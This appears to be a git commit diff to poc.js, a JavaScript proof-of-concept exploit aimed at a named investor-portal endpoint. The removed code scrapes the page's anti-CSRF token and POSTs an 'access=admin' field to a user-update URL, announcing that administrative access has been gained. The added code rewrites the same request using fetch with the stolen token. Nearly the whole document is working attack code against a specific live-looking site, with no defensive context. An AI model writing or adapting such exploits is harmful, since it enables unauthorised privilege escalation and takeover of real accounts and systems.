de13f7b654de6ee2ae22e77f2c494d214d0858e5
ret2eax <magicsbro@gmail.com>
2021-03-02 16:15:59 +0800

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,29 +1,21 @@
-//BEGIN
-console.log("Initiating exploit...");
+(async () => {
+      const extract = document.querySelector('input[name="_token"]').value;
 
-var priveEscTarget = "https://investorportal.ispt.net.au/user/updateField/1559";
-console.log("Targetting: " + priveEscTarget);
-console.log(" ");
-console.log("Reading response to extract anti-CSRF token...");
-var extract = document.querySelector('input[name=_token]').value;
-console.log("Token extracted successfully: " + extract);
-console.log(" ");
+      try {
+        const request = await fetch('https://investorportal.ispt.net.au/user/updateField/1559', {
+              method: 'POST',
+              cache: 'no-cache',
+              mode: 'no-cors',
+              headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-TOKEN': extract
+              }
+            });
 
-function bypassCSRF() {
-  console.log("Instantiating XMLHttpRequest...");
-  //instantiating XMLHttpRequest
-  var poc = new XMLHttpRequest();
-  console.log("Parsing token to XHR to bypass CSRF protection and assigning payload...");
-  poc.open("POST", priveEscTarget); 
-  poc.setRequestHeader("X-CSRF-TOKEN", extract);
-  var fd = new FormData();
-  fd.append('access', 'admin');
-  poc.send(fd);
-  console.log("CSRF request sent with header");
-  console.log(" ");
-  console.log("Exploit completed! You should now have Administrative access!");
-  console.log(" ");
-}
-
-bypassCSRF();
-//EOF
+        const responseJson = await request.json(); 
+        
+        console.log(responseJson);
+      } catch (e) {
+        console.log(e);
+      }
+   })();
